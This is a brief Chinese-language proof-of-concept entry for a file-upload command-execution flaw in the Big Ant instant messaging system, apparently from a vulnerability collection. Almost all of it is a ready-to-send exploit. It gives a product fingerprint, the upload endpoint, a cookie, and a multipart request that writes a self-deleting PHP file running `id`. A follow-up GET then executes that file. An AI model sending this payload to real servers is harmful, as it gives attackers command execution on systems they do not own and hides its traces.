# 大蚂蚁即时通信系统upload_file存在文件上传导致命令执行漏洞

- **系统**：大蚂蚁即时通信系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`product="即时通讯系统"`
- **请求**：`POST /api/dispersedAddin/upload_file.html HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary`　`Cookie: PHPSESSID=m905cb6sucrf6i6munki07bc5c`

**请求体 / payload**
```
------WebKitFormBoundary
Content-Disposition: form-data; name="file_info"
[{"file_path":"hello.php"}]
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.txt"
<?=`id`;unlink(__FILE__);?>
------WebKitFormBoundary--
GET /hello.php HTTP/1.1
```
- **预期**：200　|　—